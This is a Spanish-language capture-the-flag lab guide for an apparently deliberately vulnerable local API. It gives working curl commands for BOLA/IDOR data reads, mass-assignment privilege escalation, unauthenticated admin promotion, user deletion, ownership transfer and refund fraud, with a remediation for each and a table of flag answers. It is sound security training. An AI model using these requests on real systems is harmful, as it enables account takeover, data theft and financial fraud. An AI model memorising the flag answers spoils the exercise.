# Laboratorio 2 — Autorización: BOLA/IDOR, Mass Assignment y BFLA (API1, API3, API5)

> **Perspectiva red team**: una vez dentro del sistema (o con superficie pública detectada), el atacante enumera **objetos por ID** (BOLA), intenta **escalar privilegios** en la propia petición (mass assignment) y prueba **funciones administrativas** sin el rol requerido (BFLA). En un pentest real, esta es la fase en la que se demuestra el impacto → robo de datos, secuestro de cuentas y control total.

**Duración sugerida**: 2h · **Dificultad global**: Fácil–Media (segundo escalón)

> **Orden**: la fase empieza con los accesos **fáciles** a objetos ajenos y termina con los dos de dificultad **Media**. Requiere un JWT (Lab 1·R02) y nociones de los IDs seed.

| Reto | Tema | Dificultad |
|---|---|---|
| R07 | BOLA: leer órdenes ajenas | Fácil |
| R08 | IDOR: email del dueño de productos | Fácil |
| R09 | Mass Assignment en registro | Fácil |
| R10 | BFLA: promover a admin | Fácil |
| R11 | IDOR: transferir propiedad ajena | Media |
| R12 | BOLA: refund de orden ajena | Media |

## Objetivos de aprendizaje
1. Identificar y explotar **Broken Object Level Authorization** (BOLA/IDOR): acceder a recursos ajenos cambiando IDs.
2. Explotar **Mass Assignment** para escalar privilegios o alterar balances al registrarse/crear recursos.
3. Explotar **Broken Function Level Authorization** (BFLA): funciones administrativas accesibles sin rol.

**Recordatorio de IDs/credenciales**: `admin`(1), `john`(2), `jim`(3), `superadmin`(4). Productos 1–4.

> **¿Prefieres Burp Suite?** Todo este lab es **Repeater puro**: cambiar IDs en URLs, añadir campos al JSON y llamar a endpoints de admin públicos. Navegador proxyado a `127.0.0.1:8080`; config y límites en el **Anexo 7** del `README.md`.

> **¿Dónde está la flag?** Al completar un reto, la bandera ya viene **en la propia respuesta HTTP**: respuestas JSON con los campos `flag` (única) y `flags` (lista); respuestas no-JSON (HTML/archivos/redirects) con la cabecera `X-Flag`/`X-Flags`. Detalle en la sección 4 del `README.md`.

---

## R07 — BOLA: leer detalles de orden ajena

**OWASP**: API1 · **Dificultad**: Fácil
**Prerequisitos**: R02 (un `access_token`). Saber los IDs de usuarios/órdenes (seed: órdenes 1, 2; `User.query.first()` auto-crea una si pides una inexistente).

**Objetivo**: leer los detalles completos (id, producto, cantidad, método de pago) de una orden que no es tuya.

**Pasos**
1. Obtén un JWT (no importa de quién):
   ```bash
   JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
     -H 'Content-Type: application/json' -d '{"username":"john","password":"password123"}' \
     | jq -r .access_token)
   ```
2. Lee órdenes por ID secuencial:
   ```bash
   curl -s http://localhost:5000/api/orders/1/details -H "Authorization: Bearer $JWT"
   curl -s http://localhost:5000/api/orders/2/details -H "Authorization: Bearer $JWT"
   ```
3. Nota el **efecto colateral**: si pides una orden inexistente, el servidor la **crea** para devolvértela (mira `bola_get_order_details`, app.py:3046) — la muestra queda asignada al **primer usuario de la tabla** (`User.query.first()`, el admin), otro síntoma de mala lógica.

**Prueba de éxito**: la respuesta (sin comprobar propiedad) incluye `user_id`, `product_id`, `amount`, `status`, `payment_method` de órdenes ajenas.

**Flag**: `FH{bola-order-details}`

> **Con Burp**: captura `GET /api/orders/1/details` con tu token → `Send to Repeater` y cambia el `{id}` por 2, 3, ... (IDs secuenciales).

**Remediación**: autorización server-side por recurso: `if order.user_id != current_user.id: 403`.

---

## R08 — IDOR: email del dueño de cualquier producto

**OWASP**: API1 · **Dificultad**: Fácil (¡sin autenticación!)
**Prerequisitos**: ninguno (endpoint público). Útil de cara a R11 (saber owners) y Lab 4.

**Objetivo**: filtrar `owner_id` y `owner_email` de cualquier producto, sin login.

**Pasos**
```bash
curl -s http://localhost:5000/api/products/1/owner-info
curl -s http://localhost:5000/api/products/4/owner-info
```

**Prueba de éxito**: `{"product_id":1,"name":"Classic Tee","owner_id":2,"owner_email":"john@example.com",...}` — endpoint **público**.

**Flag**: `FH{idor-owner-info}`

> **Con Burp**: es un `GET` **público** — en `Repeater` cambia `/api/products/1/owner-info` → `/2`, `/3`, `/4` y recoge owner_id/owner_email sin autenticar.

**Remediación**: requerir autenticación + control de acceso; no exponer emails de terceros.

---

## R09 — Mass Assignment en registro (`is_admin`, `balance`)

**OWASP**: API3 · **Dificultad**: Fácil
**Prerequisitos**: R01 (localizar el endpoint en Swagger). R02 para confirmar el login posterior del usuario creado.

**Objetivo**: registrarse pasando campos arbitrarios que el constructor `User(**data)` acepta sin validar.

**Pasos**
```bash
curl -s -X POST http://localhost:5000/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn", "password":"s3cret", "email":"p@x.com", "is_admin": true, "balance": 999999}'
```
2. Valida (el endpoint `/api/secure/users/me` no expone `is_admin`/`balance`; compruébalo con GraphQL, que tampoco pide auth):
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query -H 'Content-Type: application/json' \
     -d '{"query":"{ user }"}' | jq '.data.users[] | select(.username=="pwn")'
   ```

**Prueba de éxito**: la fila de `pwn` muestra `is_admin: true` y `balance: 999999.0`. (Alternativa web: formulario `/register` con los mismos campos en form-data.)

**Flag**: `FH{mass-assignment-register}`

> **Con Burp**: en `Repeater` añade campos extra al body JSON del `register` (`"is_admin": true`, `"balance": 999999`). En la pestaña de `POST /register` del navegador usa form-data. Confirma con el `POST /graphql/query` (público) en `Repeater`.

**Remediación**: whitelist estricta de campos permitidos (p.ej. `only=["username","password","email"]`); el rol y el balance los setea el servidor.

---

## R10 — BFLA: promover a admin (y borrar usuarios)

**OWASP**: API5 · **Dificultad**: Fácil (¡público!)
**Prerequisitos**: R09 (ideal: tener una cuenta propia `attacker` que promover). No hace falta autenticación.

**Objetivo**: usar funciones "administrativas" sin tener ese rol.

**Pasos**
1. Promover a tu usuario como admin — **sin autenticación**:
   ```bash
   curl -s -X POST http://localhost:5000/api/admin/promote \
     -H 'Content-Type: application/json' -d '{"username":"attacker"}'
   ```
2. Confirmar con GraphQL (`/api/secure/users/me` no expone `is_admin`) → `is_admin: true`:
   ```bash
   curl -s -X POST http://localhost:5000/graphql/query -H 'Content-Type: application/json' \
     -d '{"query":"{ user }"}' | jq '.data.users[] | select(.username=="attacker")'
   ```
3. (Extra) Borrar a otro usuario con token de un no-admin:
   ```bash
   JWT=$(curl -s -X POST http://localhost:5000/api/auth/login -H 'Content-Type: application/json' \
     -d '{"username":"john","password":"password123"}' | jq -r .access_token)
   # registra una víctima sin productos (borrar a un dueño de productos da 500 por FK)
   curl -s -X POST http://localhost:5000/api/auth/register \
     -H 'Content-Type: application/json' -d '{"username":"victim","password":"v","email":"v@x.com"}'
   curl -s -X DELETE http://localhost:5000/api/secure/delete-user/7 -H "Authorization: Bearer $JWT"
   ```

**Prueba de éxito**: promoción responde `{"message":"User promoted to admin","username":"attacker"}`; `DELETE /api/secure/delete-user/<id>` responde `{"message":"User deleted"}` con un token de john. Nota: borrar a un usuario que es dueño de productos devuelve **500** (`sqlite3.IntegrityError: NOT NULL constraint failed: products.owner_id`) — otro fallo de diseño, pero la eliminación real funciona con cuentas sin productos.

**Flag**: `FH{bfla-promote-admin}`
**Flag (extra)**: `FH{bfla-delete-user}`

> **Con Burp**: `POST /api/admin/promote` **sin token** — pásalo a `Repeater` tal cual y cambia el `username`. Para el borrado, captura el `DELETE /api/secure/delete-user/<id>` con el Bearer de un no-admin.

**Remediación**: enforce de roles vía decorador (`@admin_required`) en *cada* endpoint administrativo; minimizar superficie administrativa.

---

## R11 — IDOR: transferir propiedad de un producto ajeno

**OWASP**: API1 · **Dificultad**: Media (¡público!)
**Prerequisitos**: R08 (conocer los owners/IDs). R09 (registrar una cuenta propia `attacker`).

**Objetivo**: cambiar el `owner_id` de cualquier producto a un usuario que controlas (sin ser el dueño ni admin).

**Pasos**
1. Registra un usuario tuyo (o usa una cuenta existente), e.g. registra:
   ```bash
   curl -s -X POST http://localhost:5000/api/auth/register \
     -H 'Content-Type: application/json' \
     -d '{"username":"attacker","password":"pass123","email":"a@x.com"}'
   ```
2. Transferencia del producto 1 (de john) hacia `attacker`:
   ```bash
   curl -s -X POST http://localhost:5000/api/products/1/transfer-ownership \
     -H 'Content-Type: application/json' -d '{"username":"attacker"}'
   ```
3. Verifica en `/api/products/1/owner-info` que ahora el dueño es `attacker`.

**Prueba de éxito**: `{"message":"Ownership transferred",...}` y el owner cambia. **El endpoint no verifica rol ni propiedad.**

**Flag**: `FH{idor-transfer-ownership}`

> **Con Burp**: `POST /api/products/<id>/transfer-ownership` es **público** — `Repeater` con el body `{"username":"attacker"}` y el ID que quieras; verifica el cambio en `owner-info`.

**Remediación**: validar `product.owner_id == current_user.id` (o rol admin) y un consentimiento explícito del nuevo dueño.

---

## R12 — BOLA: modificar estado de orden ajena (auto-refund)

**OWASP**: API1 · **Dificultad**: Media (¡público!)
**Prerequisitos**: R07 (saber qué órdenes existen y de quién son). R08 (saber de quién es cada producto para interpretar el reembolso).

**Objetivo**: cambiar el `status` de cualquier orden; al usar `refunded`, se **reembolsa** al comprador y **libera el producto** → fraude de saldo.

**Pasos**
1. Comprueba una orden existente (e.g. la de un compañero). Marca como `refunded`:
   ```bash
   curl -s -X PUT http://localhost:5000/api/orders/1/status \
     -H 'Content-Type: application/json' -d '{"status":"refunded"}'
   ```
2. Mira cómo el comprador original recupera el dinero y el producto vuelve a estar disponible.

**Prueba de éxito**: `{"message":"Order status updated"}` y, en la BD, el balance del comprador sube + `is_available=True` del producto (lógica en app.py:653-663).

**Flag**: `FH{bola-order-refund}`

> **Con Burp**: `PUT /api/orders/<id>/status` público con body `{"status":"refunded"}` en `Repeater`; repite para varios IDs y observa el balance del comprador en `GET /api/users/<id>`.

**Remediación**: validar propiedad/rol; el reembolso debe ser una acción de negocio auditada y con transición de estados válida, no un `PUT` libre.

---

## Resumen de flags — Laboratorio 2

| Reto | Flag |
|---|---|
| R07 | `FH{bola-order-details}` |
| R08 | `FH{idor-owner-info}` |
| R09 | `FH{mass-assignment-register}` |
| R10 | `FH{bfla-promote-admin}` (+ `FH{bfla-delete-user}`) |
| R11 | `FH{idor-transfer-ownership}` |
| R12 | `FH{bola-order-refund}` |